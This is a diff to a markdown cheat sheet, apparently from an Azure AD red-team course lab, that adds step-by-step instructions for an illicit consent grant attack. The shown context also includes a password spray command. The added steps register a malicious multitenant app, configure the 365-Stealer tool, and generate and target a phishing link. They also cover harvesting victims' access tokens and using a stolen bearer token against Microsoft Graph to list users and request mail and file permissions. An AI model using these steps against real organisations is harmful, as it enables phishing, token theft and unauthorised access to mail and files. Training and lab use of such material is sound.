@@ -95,11 +95,75 @@ Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
 ```
 
 # Initial access attacks
-#### Password spray
+## Password spray
 - https://github.com/dafthack/MSOLSpray
 - https://github.com/ustayready/fireprox
 ```
 Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose
+```
+
+## Illicit Consent Grant
+#### Create a application
+- Login to the Azure portal and in the left menu go to 'Azure Active Directory' --> 'App registrations' and click 'new registration'
+- Set a application name and choose 'Accounts in any organizational directory (Any Azure AD Directory - Multitenant'
+- Use the URL of the student VM in the URI (https://172.16.151.x/login/authorized)
+- In the left menu go to 'Certificates & Secrets' and create a new client secret and copy it.
+- In the left menu go to 'API permissions' and add the 'user.read' and 'User.ReadBasic.All' for the Microsoft Graph.
+
+#### Check if users are allowed to consent to apps
+```
+Import-Module AzureADPreview.psd1
+
+#Use another tenant account
+$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
+Connect-AzureAD -Credential $creds
+(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
+
+#output should be
+ManagePermissionGrantsForSelf.microsoft-user-default-legacy
+```
+
+#### Setup the 365-stealer
+- Copy the 365-stealer directory to the xampp directory
+- Edit the 365-stealer.py and edit the CLIENTID (client application id), REDIRECTEDURL and CLIENTSECRET (From the certificate)
+
+#### Start the 365-stealer
+```
+&"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app
+```
+
+#### Get the phishinglink
+- Browse to https://localhost and click on readmore. Copy the link!
+
+#### Enumerating applications to send the phishing link
+- Edit the permutations.txt to add permutations such as career, hr, users, file and backup
+```
+. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
+Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
+```
+
+#### Get the access tokens
+- Browse to http://localhost:82/365-Stealer/yourvictims/
+- Click on the user and copy the access token from access_toklen.txt
+
+#### Abuse the access token requesting all users
+```
+$Token = 'eyJ0eX..'
+$URI = 'https://graph.microsoft.com/v1.0/users'
+$RequestParams = @{
+ Method = 'GET'
+ Uri = $URI
+ Headers = @{
+ 'Authorization' = "Bearer $Token"
+ }
+}
+(Invoke-RestMethod @RequestParams).value
+```
+
+#### Get admin consent
+```
+- In the left menu go to 'API permissions' and add the mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send to Microsoft Graph.
 ```
 
 # Authenticated enumeration
